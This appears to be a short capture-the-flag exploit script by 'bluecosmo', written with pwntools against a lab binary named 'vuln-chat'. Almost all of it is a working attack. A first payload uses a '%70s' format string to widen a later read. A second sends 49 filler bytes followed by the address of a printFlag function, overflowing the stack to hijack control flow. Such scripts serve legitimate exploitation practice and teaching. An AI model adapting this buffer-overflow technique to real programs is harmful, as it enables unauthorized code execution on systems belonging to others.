#!/usr/bin/env python3

# Title:        XXX.py
# Description:  X
# Author:       bluecosmo

from pwn import *

gdbcmds = """
b * main + 71
b * main + 170
b * main + 175
c
c
x/20wx $esp
c
x/20wx $esp
"""

context.terminal = ["tmux", "splitw", "-h"]
elf = context.binary = ELF("./vuln-chat")

p = process(elf.path)
# p = gdb.debug(elf.path, gdbscript=gdbcmds)

a_printflag = p32(elf.symbols["printFlag"])

payload = b"A" * 20 + b"%70s"
p.sendline(payload)

payload = b"B" * 49
payload += a_printflag
p.sendline(payload)

p.interactive()

